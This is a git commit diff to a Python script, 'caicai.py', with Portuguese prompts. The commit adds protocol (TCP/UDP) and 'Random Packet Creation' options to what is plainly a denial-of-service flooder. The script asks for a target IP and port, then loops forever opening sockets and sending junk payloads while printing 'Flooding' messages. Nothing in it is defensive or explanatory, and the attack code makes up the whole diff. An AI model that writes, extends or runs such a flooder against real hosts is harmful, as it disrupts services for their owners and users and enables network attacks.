5f2be5493fb477be8f3afab2bbcc9d9464fb2d8a
juliocarneiro <juliocarneiro@gmail.com>
2022-01-06 23:56:03 -0300

    add ifs and inputs

--- caicai.py
+++ caicai.py
@@ -26,6 +26,8 @@ print('''\r\n
 def main():
     global port
     global target
+    global protocol
+    global rpc
 
     target = str(input("IP do alvo: "))
     if target == "":
@@ -45,15 +47,36 @@ def main():
     if port == 443:
         print("Porta 443 selecionada")
 
+    protocol = str(input("Protocolo (tcp/udp): "))
+    if protocol == "":
+        protocol = "tcp"
+        print("Protocolo TCP selecionado")
+    else:
+        protocol = protocol
+
+    rpc = str(input("Random Packet Creation(On/Off): "))
+    if rpc == "":
+        rpc = "Off"
+        print("RPC Off")
+    else:
+        rpc = rpc
+
     adr = (target, port)
     data = "qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
 
     while True:
-        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        Sock.connect(adr)
+        if protocol == 'TCP' or protocol == 'tcp' or protocol == 'Tcp' or protocol == 't':
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        elif protocol == 'UDP' or protocol == 'udp' or protocol == 'Udp' or protocol == 'u':
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-        Bytes = (data*random.randrange(16, 64))
-        BytesEnc = str.encode(Bytes)
+        Sock.connect(adr)
+        if rpc == 'ON' or rpc == 'On' or rpc == 'on':
+            Bytes = (data*random.randrange(16, 64))
+            BytesEnc = str.encode(Bytes)
+        elif rpc == 'OFF' or rpc == 'Off' or rpc == 'off':
+            Bytes = (data*64)
+            BytesEnc = str.encode(Bytes)
         Sock.sendall(BytesEnc)
 
         print('Flooding {0} na porta {1} com {2} bytes de dados'.format(
